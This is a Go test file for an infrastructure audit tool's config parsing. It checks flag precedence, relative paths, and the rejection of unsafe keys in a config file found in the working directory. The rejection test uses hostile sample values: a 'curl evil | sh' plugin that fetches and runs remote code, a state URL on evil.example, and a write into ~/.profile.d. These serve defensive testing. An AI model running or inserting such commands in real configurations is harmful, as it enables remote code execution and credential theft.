package main

import (
	"io"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
)

// A config file in the current directory supplies flags; the command line
// replaces them, lists included; paths of another file are relative to it.
func TestConfig(t *testing.T) {
	dir := t.TempDir()
	t.Chdir(dir)
	conf := `
roots: [infra]
state-roots:
  - ../teams
  - /abs/tree
scan: cloudflare
scan-scope: [state]
ignore-preset: [cloudflare-system]
exclude-types: [cloudflare_api_token, cloudflare_account_member]
strict: true
format: summary
limit: 5
`
	if err := os.WriteFile(defaultConfigFile, []byte(conf), 0o644); err != nil {
		t.Fatal(err)
	}
	o, err := parseFlags(nil, io.Discard)
	if err != nil {
		t.Fatal(err)
	}
	if !slices.Equal(o.roots, []string{"infra"}) || !slices.Equal(o.stateRoots, []string{"../teams", "/abs/tree"}) ||
		!slices.Equal(o.scans, []string{"cloudflare"}) || !o.scopeState || !o.strict || o.format != "summary" || o.limit != 5 ||
		!o.exclude.Match("cloudflare_api_token") || !o.exclude.Match("cloudflare_account_member") || o.configFile != defaultConfigFile {
		t.Errorf("from the file: %+v", o)
	}
	o, err = parseFlags([]string{"-format", "json", "-exclude-types", "x_*", "-strict=false", "other"}, io.Discard)
	if err != nil {
		t.Fatal(err)
	}
	if o.format != "json" || o.strict || !slices.Equal(o.roots, []string{"other"}) || o.exclude.Match("cloudflare_api_token") || !o.exclude.Match("x_y") {
		t.Errorf("command line over the file: %+v", o)
	}
	// adopt has no -format: the shared file still works.
	if o, err := parseFlags([]string{"adopt"}, io.Discard); err != nil || !o.adopt || !o.strict {
		t.Errorf("adopt with the file: %+v, %v", o, err)
	}
	if o, err := parseFlags([]string{"-no-config"}, io.Discard); err != nil || o.strict || len(o.scans) > 0 || o.configFile != "" {
		t.Errorf("-no-config: %+v, %v", o, err)
	}

	// Another file: its relative paths are relative to it.
	sub := filepath.Join(dir, "audits")
	os.Mkdir(sub, 0o755)
	os.WriteFile(filepath.Join(sub, "cf.yaml"), []byte("roots: [../infra]\nstate-roots: [teams]\nplugin: ./list.sh\nignore: ignore.txt\n"), 0o644)
	o, err = parseFlags([]string{"-config", "audits/cf.yaml"}, io.Discard)
	if err != nil {
		t.Fatal(err)
	}
	if !slices.Equal(o.roots, []string{filepath.Join(dir, "infra")}) || !slices.Equal(o.stateRoots, []string{filepath.Join(sub, "teams")}) ||
		o.ignorePath != filepath.Join(sub, "ignore.txt") || !slices.Equal(o.plugins, []string{"./list.sh"}) {
		t.Errorf("-config elsewhere: %+v", o)
	}
}

// A file read on its own (it may come with a cloned repository) cannot run
// commands or send credentials; unknown keys and bad values are errors.
func TestConfigRejected(t *testing.T) {
	for conf, want := range map[string]string{
		"plugin: [curl evil | sh]\n":            "only from a file given with -config",
		"terraform: ./evil\n":                   "only from a file given with -config",
		"o: ~/.profile.d/x\n":                   "only from a file given with -config",
		"init: true\n":                          "only from a file given with -config",
		"state: [https://evil.example/state]\n": "state URL",
		"stat-roots: [x]\n":                     `unknown key "stat-roots"`,
		"no-config: true\n":                     "unknown key",
		"strict: [true, false]\n":               "true or false",
		"scan: {cloudflare: true}\n":            "want a value",
		"limit: lots\n":                         "limit: parse error",
		"scan: [cloudflare\n":                   "yaml",
	} {
		dir := t.TempDir()
		t.Chdir(dir)
		os.WriteFile(defaultConfigFile, []byte(conf), 0o644)
		if _, err := parseFlags([]string{"adopt"}, io.Discard); err == nil || !strings.Contains(err.Error(), want) {
			t.Errorf("%q: %v, want %q", conf, err, want)
		}
	}
	// Keys of the report mode: refresh runs the root's data sources,
	// include-attrs puts attribute values into the output.
	for _, conf := range []string{"refresh: true\n", "include-attrs: [content]\n", "allow-unpinned: true\n"} {
		t.Chdir(t.TempDir())
		os.WriteFile(defaultConfigFile, []byte(conf), 0o644)
		if _, err := parseFlags(nil, io.Discard); err == nil || !strings.Contains(err.Error(), "only from a file given with -config") {
			t.Errorf("%q: %v", conf, err)
		}
	}
	// The same keys are fine in a file the user names.
	dir := t.TempDir()
	t.Chdir(dir)
	os.WriteFile("audit.yaml", []byte("plugin: [./list.sh]\nstate: [https://gitlab.example/state]\ninit: true\n"), 0o644)
	if o, err := parseFlags([]string{"-config", "audit.yaml"}, io.Discard); err != nil || !o.init || len(o.plugins) != 1 || o.states[0] != "https://gitlab.example/state" {
		t.Errorf("-config with commands: %+v, %v", o, err)
	}
}
